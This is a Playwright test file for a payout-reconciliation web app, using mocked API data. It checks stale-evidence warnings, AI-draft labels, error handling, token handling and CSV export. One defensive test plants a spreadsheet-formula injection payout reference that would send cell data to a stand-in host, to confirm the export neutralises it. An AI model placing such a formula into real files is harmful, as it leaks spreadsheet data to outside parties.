// Browser tests for stale results, error states, AI-draft labelling, and exception
// summaries. Every /api/* response is intercepted by tests/mock.js using contract-shaped
// fixtures; no real backend is involved.
import fs from 'node:fs';
import { test, expect } from '@playwright/test';
import { installApi } from './mock.js';
import { configOllama, configRules, proposalFor, seededState } from './fixtures.js';

function trackErrors(page) {
  const errors = [];
  page.on('pageerror', e => errors.push(String(e)));
  page.on('dialog', d => { errors.push('unexpected dialog: ' + d.message()); d.dismiss(); });
  return errors;
}
const openCase = (page, payout) => page.locator('tbody tr', { hasText: payout }).getByRole('button', { name: payout }).click();
const setCase = (state, id, patch) => { const i = state.cases.findIndex(c => c.id === id); state.cases[i] = { ...state.cases[i], ...patch }; };

test('a review reset by new evidence is explained, with the earlier note', async ({ page }) => {
  const errors = trackErrors(page);
  const state = seededState();
  // The server re-opened PO-1002 after new evidence; the audit log still holds the old review and draft.
  state.audit.push(
    { at: '2026-01-07T10:00:00Z', action: 'investigation.drafted', detail: 'PO-1002: rules' },
    { at: '2026-01-07T10:05:00Z', action: 'case.reviewed', detail: 'PO-1002: Fee schedule confirmed with the processor.' },
    { at: '2026-01-08T09:00:00Z', action: 'import.completed', detail: 'bank: 1 new records' },
  );
  const mockApi = installApi(page, { config: configRules(), state });
  await mockApi.install();
  await page.goto('/');

  await expect(page.locator('tbody tr', { hasText: 'PO-1002' }).locator('.tag.reopened')).toHaveText('Reopened');
  await expect(page.locator('tbody tr', { hasText: 'PO-1003' }).locator('.tag.reopened')).toHaveCount(0);
  await openCase(page, 'PO-1002');
  const banner = page.locator('.detail .banner.warn').first();
  await expect(banner).toContainText('Your earlier review no longer applies.');
  await expect(banner).toContainText('Fee schedule confirmed with the processor.');
  await expect(page.locator('.history')).toContainText('Review recorded');
  await expect(page.locator('.history')).toContainText('Draft suggestion prepared');
  expect(errors).toEqual([]);
});

test('checking for updates reports what changed and marks those payouts until opened', async ({ page }) => {
  const errors = trackErrors(page);
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  await page.goto('/');
  await expect(page.locator('.freshness')).toContainText('Revision 2');

  await page.getByRole('button', { name: 'Check for updates' }).click();
  await expect(page.getByRole('status')).toContainText('No changes. You are seeing the current records.');

  // Another tab imports a bank deposit for PO-1003.
  const st = mockApi.store.state;
  st.records['bank:1003-b'] = { id: 'bank:1003-b', source: 'bank', payout: 'PO-1003', currency: 'USD', date: '2026-01-09', gross_cents: 6850, fee_cents: 0, description: 'ACH deposit PO-1003' };
  setCase(st, 'case-1003', { actual_cents: 6850, delta_cents: 0, kind: 'matched', status: 'matched', fingerprint: 'fp-1003-v2', evidence: ['processor:1003-a', 'bank:1003-b'] });
  st.revision = 3;
  await page.getByRole('button', { name: 'Check for updates' }).click();
  await expect(page.getByRole('status')).toContainText('Workspace updated: 1 payout has new evidence.');
  await expect(page.locator('.freshness')).toContainText('Revision 3');
  const row = page.locator('tbody tr', { hasText: 'PO-1003' });
  await expect(row.locator('.tag.updated')).toHaveText('New evidence');
  await expect(row.locator('.badge')).toHaveText('Matched');

  await openCase(page, 'PO-1003');
  await expect(page.locator('.detail .banner.info')).toContainText('New evidence arrived for this payout');
  await openCase(page, 'PO-1002');
  await expect(row.locator('.tag.updated')).toHaveCount(0);
  expect(errors).toEqual([]);
});

test('evidence that changes while a note is being written blocks recording until confirmed', async ({ page }) => {
  const errors = trackErrors(page);
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  await page.goto('/');
  await openCase(page, 'PO-1002');
  await page.getByLabel('Reviewer note').fill('Checked the processor fee schedule for January.');

  setCase(mockApi.store.state, 'case-1002', { fingerprint: 'fp-1002-v2' });
  mockApi.store.state.revision++;
  await page.getByRole('button', { name: 'Check for updates' }).click();

  await expect(page.getByRole('alert')).toContainText('records changed after you started this note');
  await expect(page.getByLabel('Reviewer note')).toHaveValue('Checked the processor fee schedule for January.');
  await expect(page.getByRole('button', { name: 'Record review' })).toBeDisabled();
  await page.getByRole('button', { name: 'I’ve checked the updated records' }).click();
  await page.getByRole('button', { name: 'Record review' }).click();
  await expect(page.getByRole('status')).toContainText('Review recorded for PO-1002.');
  const review = mockApi.store.requests.find(r => r.path.endsWith('/review'));
  expect(JSON.parse(review.body)).toEqual({ fingerprint: 'fp-1002-v2', note: 'Checked the processor fee schedule for January.' });
  expect(errors).toEqual([]);
});

test('a draft that finishes after the reviewer moved on stays with its own payout', async ({ page }) => {
  const errors = trackErrors(page);
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  let release;
  const gate = new Promise(r => { release = r; });
  mockApi.queue('POST', '/cases/:id/investigate', async route => {
    await gate;
    setCase(mockApi.store.state, 'case-1002', { proposal: proposalFor('case-1002') });
    mockApi.store.state.revision++;
    return route.fulfill({ json: proposalFor('case-1002') });
  });
  await page.goto('/');
  await openCase(page, 'PO-1002');
  await page.getByRole('button', { name: 'Investigate exception' }).click();
  await expect(page.locator('tbody tr', { hasText: 'PO-1002' }).locator('.tag.investigating')).toBeVisible();

  await openCase(page, 'PO-1003');
  await expect(page.getByRole('button', { name: 'Another investigation is running…' })).toBeDisabled();
  release();
  await expect(page.getByRole('status')).toContainText('Draft suggestion ready for PO-1002. Open that payout to read it.');
  await expect(page.locator('.detail h2')).toHaveText('PO-1003');
  await expect(page.locator('.detail .proposal')).toHaveCount(0);
  await expect(page.locator('tbody tr', { hasText: 'PO-1002' }).locator('.tag.drafted')).toHaveText('Draft ready');
  expect(errors).toEqual([]);
});

test('model mode labels come from config and from each proposal, not assumed', async ({ page }) => {
  const errors = trackErrors(page);
  const state = seededState();
  setCase(state, 'case-1002', { proposal: { ...proposalFor('case-1002'), mode: 'ollama:qwen3:4b' } });
  const mockApi = installApi(page, { config: configOllama(), state });
  await mockApi.install();
  await page.goto('/');
  await openCase(page, 'PO-1002');
  await expect(page.locator('.draft .mode')).toHaveText('Local model configured: qwen3:4b');
  await expect(page.locator('.draftflag')).toContainText('Local model qwen3:4b');
  await expect(page.locator('.draftflag')).toContainText('nothing has been sent, paid, or changed');
  await openCase(page, 'PO-1004');
  await expect(page.locator('.draftempty')).toContainText('It cannot change amounts or contact anyone.');
  expect(errors).toEqual([]);
});

test('status-specific errors explain recovery: 503 on load, 429 on investigate', async ({ page }) => {
  const errors = trackErrors(page);
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  mockApi.queue('GET', '/state', route => route.fulfill({ status: 503, json: { error: 'request limiter unavailable' } }));
  await page.goto('/');
  const alert = page.getByRole('alert');
  await expect(alert).toContainText('A required service is temporarily unavailable.');
  await expect(alert).toContainText('request limiter unavailable');
  await alert.getByRole('button', { name: 'Try again' }).click();
  await expect(page.getByRole('table')).toBeVisible();

  mockApi.queue('POST', '/cases/:id/investigate', route => route.fulfill({ status: 429, json: { error: 'Investigation limit reached. Try again in one minute.' } }));
  await openCase(page, 'PO-1002');
  await page.getByRole('button', { name: 'Investigate exception' }).click();
  await expect(page.getByRole('alert')).toContainText('PO-1002: Too many requests right now.');
  await expect(page.getByRole('alert')).toContainText('Investigation limit reached.');
  await expect(page.locator('.detail .proposal')).toHaveCount(0);
  expect(errors).toEqual([]);
});

test('a rejected token hides workspace data and is not kept in the tab', async ({ page }) => {
  const errors = trackErrors(page);
  await page.addInitScript(() => { try { if (!sessionStorage.getItem('seeded')) { sessionStorage.setItem('clearledger-token', 'old-token'); sessionStorage.setItem('seeded', '1'); } } catch {} });
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  mockApi.queue('GET', '/state', route => route.fulfill({ status: 401, json: { error: 'invalid token' } }));
  await page.goto('/');
  await expect(page.getByLabel('Workspace access token')).toBeVisible();
  await expect(page.getByRole('table')).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Download CSV summary' })).toBeDisabled();
  expect(await page.evaluate(() => sessionStorage.getItem('clearledger-token'))).toBeNull();
  expect(mockApi.store.requests[0].headers.authorization).toBe('Bearer old-token');

  await page.getByLabel('Workspace access token').fill('new-token');
  await page.getByRole('button', { name: 'Connect' }).click();
  await expect(page.getByRole('table')).toBeVisible();
  expect(mockApi.store.requests.at(-1).headers.authorization).toBe('Bearer new-token');
  expect(errors).toEqual([]);
});

test('the exception summary filters by type and reports amounts from server state', async ({ page }) => {
  const errors = trackErrors(page);
  const mockApi = installApi(page, { config: configRules(), state: seededState() });
  await mockApi.install();
  await page.goto('/');
  const summary = page.getByRole('region', { name: 'Workspace summary' });
  await expect(summary).toContainText('$477.40'); // sum of server expected_cents
  const awaiting = page.getByRole('button', { name: /^Awaiting deposit/ });
  await expect(awaiting).toContainText('$68.50 not yet in bank records');
  await awaiting.click();
  await expect(awaiting).toHaveAttribute('aria-pressed', 'true');
  await expect(page.locator('tbody tr')).toHaveCount(1);
  await expect(page.locator('tbody tr').first()).toContainText('PO-1003');
  await page.getByRole('button', { name: 'Show all types' }).click();
  await expect(page.locator('tbody tr')).toHaveCount(7);

  await openCase(page, 'PO-1003');
  await expect(page.locator('.why')).toContainText('This is not marked overdue');
  await expect(page.locator('.records')).toContainText('No bank deposit uses reference PO-1003');
  await openCase(page, 'PO-1005');
  await expect(page.locator('.calc').first()).toContainText('Refunds');
  await expect(page.locator('.calc').first()).toContainText('$163.40');
  expect(errors).toEqual([]);
});

test('the CSV summary neutralises spreadsheet formulas in payout references', async ({ page }) => {
  const errors = trackErrors(page);
  const state = seededState();
  setCase(state, 'case-1007', { payout: '=HYPERLINK("https://x.test/?"&A2,"PO-1007")' });
  const mockApi = installApi(page, { config: configRules(), state });
  await mockApi.install();
  await page.goto('/');
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Download CSV summary' }).click()]);
  const lines = fs.readFileSync(await download.path(), 'utf8').trim().split('\r\n');
  expect(lines).toContain('"\'=HYPERLINK(""https://x.test/?""&A2,""PO-1007"")",open,unexpected_deposit,0,1200,1200,0.00,12.00,12.00,1');
  expect(lines).toContain('PO-1002,open,amount_mismatch,4900,4400,-500,49.00,44.00,-5.00,2'); // negatives stay numbers
  expect(errors).toEqual([]);
});

test('activity uses plain labels, filters by type, and links to the payout', async ({ page }) => {
  const errors = trackErrors(page);
  const state = seededState();
  state.audit.push({ at: '2026-01-07T10:00:00Z', action: 'investigation.failed', detail: 'PO-1002: local model request failed' });
  const mockApi = installApi(page, { config: configRules(), state });
  await mockApi.install();
  await page.goto('/');
  await page.getByRole('button', { name: 'Activity' }).click();
  await expect(page.locator('.activityrow').first()).toContainText('Investigation failed');
  await page.getByRole('group', { name: 'Filter activity' }).getByRole('button', { name: /^Imports/ }).click();
  await expect(page.locator('.activityrow')).toHaveCount(2);
  await page.getByRole('group', { name: 'Filter activity' }).getByRole('button', { name: /^Failures/ }).click();
  await expect(page.locator('.activityrow')).toHaveCount(1);
  await page.getByRole('button', { name: 'Open PO-1002' }).click();
  await expect(page.locator('.detail h2')).toHaveText('PO-1002');
  await expect(page.locator('.history')).toContainText('local model request failed');
  expect(errors).toEqual([]);
});

test('long references, descriptions, and large amounts stay inside a phone-width layout', async ({ page }) => {
  const errors = trackErrors(page);
  await page.setViewportSize({ width: 360, height: 780 });
  const state = seededState();
  const longRef = 'PO-' + 'LONGREFERENCE'.repeat(7);
  setCase(state, 'case-1002', { payout: longRef, expected_cents: 125000000000, actual_cents: 124999999500 });
  state.records['processor:1002-a'].description = 'Settlement batch, ' + 'with a very long processor description '.repeat(10);
  const mockApi = installApi(page, { config: configRules(), state });
  await mockApi.install();
  await page.goto('/');
  await openCase(page, longRef);
  await expect(page.getByRole('button', { name: 'Show full description' })).toBeVisible();
  await expect(page.locator('.figures')).toContainText('$1,250,000,000.00');
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  expect(overflow).toBeLessThanOrEqual(1);
  expect(errors).toEqual([]);
});
